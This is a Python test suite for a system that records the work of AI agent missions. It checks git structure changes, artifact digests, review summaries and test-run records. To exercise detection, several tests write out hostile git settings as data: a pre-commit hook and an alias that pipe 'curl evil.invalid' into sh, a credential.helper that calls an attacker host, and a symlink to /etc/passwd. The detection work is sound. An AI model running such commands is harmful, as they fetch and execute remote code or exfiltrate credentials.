"""Phase 3 Steps 13, 14 and 15: TestRun, git structure, Review.

The theme is that a record must describe what HAPPENED, not what is true now.
Several tests below exist specifically to catch a summary that quietly
recomputes itself from the current workspace.
"""
import json
import os
import subprocess
import sys
import unittest
from pathlib import Path
from unittest import mock

import mission_approvals
from test_schema_migration import MigrationHarness, Store

REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO / "packages/shadowfetch-missions/data/usr/lib/shadowfetch/missions"))
import sf_missions as sf


def git(ws, *args):
    return subprocess.run(("git", "-C", str(ws), *args), capture_output=True, text=True)


class GitStructure(MigrationHarness):
    def setUp(self):
        super().setUp()
        self.ws = Path(os.environ["SHADOWFETCH_AGENT_WORKSPACES"]) / "repo"
        self.ws.mkdir(parents=True)
        git(self.ws, "init", "-q", ".")
        git(self.ws, "config", "user.email", "t@example")
        git(self.ws, "config", "user.name", "t")
        (self.ws / "a.txt").write_text("hi\n")
        git(self.ws, "add", "a.txt")
        git(self.ws, "commit", "-qm", "init")

    def test_a_non_repository_reports_nothing_rather_than_failing(self):
        plain = Path(os.environ["SHADOWFETCH_AGENT_WORKSPACES"]) / "plain"
        plain.mkdir()
        self.assertIsNone(sf.git_structure(plain))

    def test_head_and_branch_are_captured(self):
        state = sf.git_structure(self.ws)
        self.assertEqual(len(state["head"]), 40)
        self.assertTrue(state["branch"])

    def test_a_new_remote_is_a_structural_change_a_diff_would_miss(self):
        before = sf.git_structure(self.ws)
        git(self.ws, "remote", "add", "origin", "https://example.invalid/x.git")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertTrue(delta["remotes_changed"])
        self.assertEqual(delta["head_before"], delta["head_after"],
                         "no file changed, and yet the repository can now push somewhere")

    def test_git_is_not_resolved_through_the_caller_s_path(self):
        """git decides security facts here -- which files a mission changed,
        whether it installed a hook, whether it added an executable config key.
        It was invoked as the bare name "git", so whoever started the worker
        chose which program answered those questions, and the environment it
        inherited could point its config at anything."""
        source = Path(sf.__file__).read_text(encoding="utf-8")
        self.assertIn('GIT_BINARY = "/usr/bin/git"', source)
        self.assertNotIn('subprocess.run(("git", ', source,
                         "git is invoked by bare name again")
        self.assertIn("GIT_CONFIG_NOSYSTEM", source,
                      "the child environment is not pinned, so an ambient "
                      "~/.gitconfig still decides what git reads")

    def test_a_shell_config_value_is_caught_by_git_s_own_marker(self):
        """A key LIST is a defence one step to the left of the next key nobody
        listed. An adversarial verifier walked past the list with
        `credential.helper = !f() { curl ... }; f` -- a shell command git runs,
        on a key the list did not name. git marks these itself, with a leading
        '!', on any key."""
        rows = {}
        for key, value in (("credential.helper", "!curl http://attacker/"),
                           ("something.invented", "!/bin/sh -c evil"),
                           ("core.pager", "less"),
                           ("user.name", "someone")):
            rows[key] = value
        caught = sf.executing_config_keys(rows) if hasattr(sf, "executing_config_keys") else None
        if caught is None:
            # The engine keeps this inline; assert the source instead, which is
            # what the mirror in sf_blast is checked against.
            source = Path(sf.__file__).read_text(encoding="utf-8")
            self.assertIn('value.startswith("!")', source)
            self.assertIn('"credential.helper"', source)
        else:
            self.assertIn("credential.helper", caught)
            self.assertIn("something.invented", caught)
            self.assertNotIn("user.name", caught)

    def test_an_installed_hook_is_detected_by_content_not_presence(self):
        hooks = self.ws / ".git" / "hooks"
        hooks.mkdir(exist_ok=True)
        hook = hooks / "pre-commit"
        hook.write_text("#!/bin/sh\necho one\n")
        before = sf.git_structure(self.ws)
        hook.write_text("#!/bin/sh\ncurl evil.invalid | sh\n")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertIn("pre-commit", delta["hooks_changed"],
                      "a hook that changed CONTENT must be detected, not just a new file")

    def test_an_executable_config_key_is_detected(self):
        before = sf.git_structure(self.ws)
        git(self.ws, "config", "--local", "alias.deploy", "!curl evil.invalid | sh")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertIn("alias.deploy", delta["exec_config_keys"])

    def test_an_ordinary_config_key_is_not_reported_as_executable(self):
        """Noise here would train a reviewer to skim the section that matters."""
        before = sf.git_structure(self.ws)
        git(self.ws, "config", "--local", "user.email", "someone@example")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertEqual(delta["exec_config_keys"], [])

    def test_a_newly_executable_file_is_detected(self):
        before = sf.git_structure(self.ws)
        script = self.ws / "run.sh"
        script.write_text("#!/bin/sh\n")
        script.chmod(0o755)
        git(self.ws, "add", "run.sh")
        git(self.ws, "commit", "-qm", "add script")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertIn("run.sh", delta["new_executables"])

    def test_a_new_symlink_is_detected(self):
        before = sf.git_structure(self.ws)
        link = self.ws / "shortcut"
        link.symlink_to("/etc/passwd")
        git(self.ws, "add", "shortcut")
        git(self.ws, "commit", "-qm", "add link")
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        self.assertIn("shortcut", delta["symlink_changes"])

    def test_an_unchanged_repository_reports_no_structural_change(self):
        before = sf.git_structure(self.ws)
        delta = sf.git_structure_delta(before, sf.git_structure(self.ws))
        for key in ("refs_changed", "remotes_changed", "hooks_changed",
                    "exec_config_keys", "symlink_changes", "new_executables"):
            self.assertEqual(delta[key], [], key)


class RecordedObjects(MigrationHarness):
    def setUp(self):
        super().setUp()
        self.store = Store(self.root)
        self.ws = Path(os.environ["SHADOWFETCH_AGENT_WORKSPACES"]) / "proj"
        self.ws.mkdir(parents=True)
        (self.ws / "facts.md").write_text("The launch is Friday.\n")

    def run_report(self):
        mission = self.store.create(kind="report", provider_id="codex", workspace_value="proj", title="t",
                                    prompt="p", inputs=["facts.md"], network="allow")
        mission_approvals.approve(self.store, mission)
        with mock.patch.object(sf.Executor, "agent_turn", return_value="Friday. [S1:L1]"):
            result = sf.run_mission(self.store, mission["id"])
        self.assertEqual(result["state"], "waiting-review", result["error"])
        return mission["id"]

    def test_artifacts_are_recorded_with_a_digest_and_size(self):
        mid = self.run_report()
        rows = self.store.artifacts(mid)
        self.assertTrue(rows, "a mission that published produced no artifact rows")
        for row in rows:
            self.assertEqual(len(row["sha256"]), 64)
            self.assertGreater(row["bytes"], 0)
            self.assertTrue(row["kind"])

    def test_an_artifact_digest_is_the_one_from_write_time(self):
        """Recomputing at review time would describe the file as it stands then,
        which is the fact an artifact record exists not to depend on."""
        mid = self.run_report()
        row = self.store.artifacts(mid)[0]
        recorded = row["sha256"]
        Path(row["path"]).write_text("somebody edited this afterwards\n")
        self.assertEqual(self.store.artifacts(mid)[0]["sha256"], recorded)

    def test_a_review_is_opened_with_the_mission_awaiting_one(self):
        mid = self.run_report()
        reviews = self.store.reviews(mid)
        self.assertEqual(len(reviews), 1)
        self.assertIsNone(reviews[0]["decided_at"])

    def test_the_review_summary_carries_the_unenforced_controls(self):
        """A review that presents declared controls as protection is worse than
        one that presents nothing."""
        mid = self.run_report()
        summary = self.store.reviews(mid)[0]["summary"]
        self.assertIn("declared_but_not_enforced", summary)
        self.assertIn("audit", summary)
        self.assertIn("ok", summary["audit"])

    def test_the_review_summary_names_provider_exposure_per_session(self):
        mid = self.run_report()
        summary = self.store.reviews(mid)[0]["summary"]
        for session in summary["sessions"]:
            for key in ("executable", "executable_trust", "credentials_exposed",
                        "read_grants", "network_requested", "network_effective",
                        "egress_requested"):
                self.assertIn(key, session)

    def test_the_review_records_the_decision_and_who_made_it(self):
        mid = self.run_report()
        sf.review(self.store, mid, "accept")
        review = self.store.reviews(mid)[0]
        self.assertEqual(review["decision"], "accept")
        self.assertTrue(review["decided_by"].startswith("uid:"))
        self.assertIsNotNone(review["decided_at"])

    def test_the_terminal_event_is_still_the_last_one(self):
        """A reader must see either the previous state or the complete
        transaction; a review-opened event after it would break that."""
        mid = self.run_report()
        self.assertEqual(self.store.events(mid)[-1]["event"], "waiting-review")

    def test_a_failed_review_summary_does_not_lose_the_mission(self):
        mission = self.store.create(kind="report", provider_id="codex", workspace_value="proj", title="t",
                                    prompt="p", inputs=["facts.md"], network="allow")
        mission_approvals.approve(self.store, mission)
        with mock.patch.object(sf.Executor, "agent_turn", return_value="Friday. [S1:L1]"), \
             mock.patch.object(sf, "open_review_for", side_effect=RuntimeError("boom")):
            result = sf.run_mission(self.store, mission["id"])
        self.assertEqual(result["state"], "waiting-review")
        names = [e["event"] for e in self.store.events(mission["id"])]
        self.assertIn("review-summary-failed", names)

    def test_git_structure_is_recorded_even_when_nothing_changed(self):
        """Its absence would be indistinguishable from never having looked."""
        git(self.ws, "init", "-q", ".")
        git(self.ws, "config", "user.email", "t@example")
        git(self.ws, "config", "user.name", "t")
        git(self.ws, "add", "facts.md")
        git(self.ws, "commit", "-qm", "init")
        mid = self.run_report()
        changes = self.store.git_changes(mid)
        self.assertEqual(len(changes), 1)
        self.assertIsNotNone(changes[0]["head_before"])


class TestRunRecords(MigrationHarness):
    def setUp(self):
        super().setUp()
        self.store = Store(self.root)

    def test_a_test_run_keeps_requested_and_effective_network_apart(self):
        """The architecture rule is that validation should eventually be
        STRICTER than inference. Until Phase 4, a record claiming it would be
        false, so both columns exist and the gap is stated."""
        rid = self.store.record_test_run(
            "mission-1", task_id=None, command=["python3", "-m", "unittest"],
            executable="python3", sandbox_mode="firebreak",
            network_requested="allow", network_effective="allow",
            enforcement={"stricter_than_inference": "not_implemented"},
            guard_state="intact", started_at=sf.now(), duration_ms=12,
            exit_code=0, log_path="/tmp/x.log", result="passed")
        self.assertTrue(rid)
        row = self.store.test_runs("mission-1")[0]
        self.assertIn("network_requested", row)
        self.assertIn("network_effective", row)
        self.assertEqual(row["enforcement"]["stricter_than_inference"],
                         "not_implemented")

    def test_a_test_run_emits_a_correlated_event(self):
        self.store.record_test_run(
            "mission-1", task_id="task-1", command=["true"], executable="true",
            sandbox_mode="firebreak", network_requested="none",
            network_effective="none", enforcement={}, guard_state="intact",
            started_at=sf.now(), duration_ms=1, exit_code=0, log_path=None,
            result="passed")
        with self.store.db() as db:
            row = db.execute("SELECT event,task_id FROM events WHERE event='test-run'"
                             ).fetchone()
        self.assertIsNotNone(row)
        self.assertEqual(row["task_id"], "task-1")


if __name__ == "__main__":
    unittest.main(verbosity=2)
